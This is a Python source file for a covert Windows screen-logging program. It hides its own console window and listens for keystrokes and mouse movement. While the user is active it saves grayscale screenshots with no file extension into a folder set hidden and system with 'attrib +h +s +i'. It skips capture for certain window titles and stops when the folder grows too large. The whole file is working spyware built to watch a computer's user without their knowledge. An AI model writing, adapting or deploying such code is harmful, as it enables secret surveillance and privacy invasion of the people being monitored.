from pynput.keyboard import Key, Listener
from pyautogui import screenshot, position
from threading import Thread
from time import sleep
from datetime import datetime
import win32gui
import win32console
import os

from win32gui import GetWindowText, GetForegroundWindow
import globalVariables
import DecryptionTests


def Hide():
    # hide the console window
    win32gui.ShowWindow(win32console.GetConsoleWindow(),
                        0)


Hide()  # placed here to speed it up, as with python it's sequential


def ScreenShot():
    # that hides the file extension well
    screenshot().convert("L").save(globalVariables.screenshotsPath + "\\" + datetime.now().
                                   strftime("%d%H%M%S"),
                                   "jpeg",
                                   optimize=True,
                                   quality=75)
    globalVariables.last_screenshot_date = datetime.now()


def IsCurrentWindowNameInBlockedList():
    for window in DecryptionTests.unwantedWindowTitlesSet:
        # GetWindowText(GetForegroundWindow()) - currently active window
        if window in GetWindowText(GetForegroundWindow()):
            return True
    return False


def CheckForMouseActivity():
    while True:
        sleep(5)
        # current mouse x and y
        if globalVariables.mouse_position != position() \
                or globalVariables.last_screenshot_date <= globalVariables.key_press_date:
            globalVariables.mouse_position = position()
            if not IsCurrentWindowNameInBlockedList():
                try:
                    ScreenShot()
                except Exception:   # this is here to fix a bug. Program was stopping
                    pass            # when ctrl+alt+del was pressed
        if globalVariables.stop_threads:
            break


def On_press(key):
    globalVariables.key_press_date = datetime.now()
    # if globalVariables.stop_threads:
    #     Thread(target=CheckForKeyActivity).exit()
    # new below


def CheckForKeyActivity():
    with Listener(
            on_press=On_press) as listener:
        listener.join()


def StopOnceItGetsTooBig():
    while True:
        try:
            if os.path.exists(globalVariables.screenshotsPath):
                size = sum(d.stat().st_size for d in os.scandir(
                    globalVariables.screenshotsPath) if d.is_file())
            if size > globalVariables.MAX_ALLOWED_FOLDER_SIZE:
                globalVariables.stop_threads = True
        except Exception:
            pass
        if globalVariables.stop_threads:
            break
        sleep(globalVariables.FOLDER_CHECK_TIME_PERIOD_IN_SECONDS)


# if the directory doesn't exist, create it and set to hidden
if not os.path.exists(globalVariables.screenshotsPath):
    os.mkdir(globalVariables.screenshotsPath)
    os.system("attrib +h +s +i " + globalVariables.screenshotsPath)

if __name__ == '__main__':
    Thread(target=CheckForMouseActivity).start()
    Thread(target=CheckForKeyActivity).start()
    Thread(target=StopOnceItGetsTooBig).start()
